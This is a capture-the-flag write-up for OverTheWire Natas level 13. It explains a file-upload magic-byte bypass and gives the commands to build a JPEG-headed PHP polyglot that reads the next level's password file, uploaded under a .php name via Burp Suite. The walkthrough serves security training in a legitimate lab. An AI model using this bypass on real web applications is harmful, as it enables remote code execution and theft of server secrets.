# Natas Level 13

## Objective

Bypass stronger file upload validation to achieve remote code execution and obtain the password for the next level.

**URL:** `http://natas13.natas.labs.overthewire.org`
**Username:** `natas13`
**Password:** `<password from Natas 12>`

---

## Enumeration

After logging in, the page looks almost identical to the previous level and provides a file upload form.

Unlike **Natas 12**, simply changing the hidden `filename` field to `.php` is not enough. Uploading a PHP file directly results in an error because the server now performs additional validation.

By viewing the PHP source code (`index-source.html`), we can inspect how uploads are handled.

Relevant code:

```php
if (filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
    echo "File is too big";
} else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
    echo "File is not an image";
} else if (! getimagesize($_FILES['uploadedfile']['tmp_name'])) {
    echo "File is not an image";
} else {
    // Upload the file
}
```

---

## Vulnerability

The application checks whether the uploaded file is an image using:

* `exif_imagetype()`
* `getimagesize()`

These functions only verify that the file begins with a valid image header. They do **not** ensure that the file contains *only* image data.

PHP code can be appended after a valid image header, creating a **polyglot file** that is both a valid image and executable PHP code.

---

## Exploitation

### 1. Create a malicious PHP payload

Create a file called `shell.php` with the following contents:

```php
<?php
echo file_get_contents('/etc/natas_webpass/natas14');
?>
```

### 2. Add a valid JPEG magic header

A JPEG file begins with the bytes:

```text
FF D8 FF E0
```

One simple way to create a valid upload is to prepend these bytes to the PHP payload. On Linux, you can use:

```bash
printf '\xFF\xD8\xFF\xE0' > shell.php
echo '<?php echo file_get_contents("/etc/natas_webpass/natas14"); ?>' >> shell.php
```

Alternatively, open a small JPEG image in a hex editor and append the PHP code to the end of the file.

### 3. Modify the filename parameter

Just like in the previous level, intercept the upload request with **Burp Suite** and change:

```text
filename=image.jpg
```

to

```text
filename=shell.php
```

The upload now passes the image validation checks because the file starts with a valid JPEG header.

### 4. Retrieve the password

After a successful upload, the server returns the file path, for example:

```text
upload/shell.php
```

Navigate to the uploaded file:

```text
http://natas13.natas.labs.overthewire.org/upload/shell.php
```

The embedded PHP code executes and displays the contents of:

```text
/etc/natas_webpass/natas14
```

revealing the password for the next level.

---

## Why This Works

The application attempts to secure uploads by verifying that the file is an image. However, it only checks the file's header using `exif_imagetype()` and `getimagesize()`. Since PHP ignores extra bytes before the `<?php` tag, a file can simultaneously satisfy the image validation and still execute as PHP when accessed through the web server.

This is a classic **magic-byte bypass** of insecure file upload validation.

---


**Flag:** Password for `natas14` obtained from:

```text
/etc/natas_webpass/natas14
```

<img width="1042" height="443" alt="Screenshot 2026-06-14 085016" src="https://github.com/user-attachments/assets/7a3b5e5d-edcc-4cf5-a82f-d128798ed765" />


---


<img width="1055" height="502" alt="Screenshot 2026-06-14 084942" src="https://github.com/user-attachments/assets/6a878745-349e-49ca-9899-030d00b600a2" />


---


<img width="1897" height="541" alt="Screenshot 2026-06-14 084116" src="https://github.com/user-attachments/assets/1a32036f-ffc8-49fb-a8f0-491b8f0769e5" />





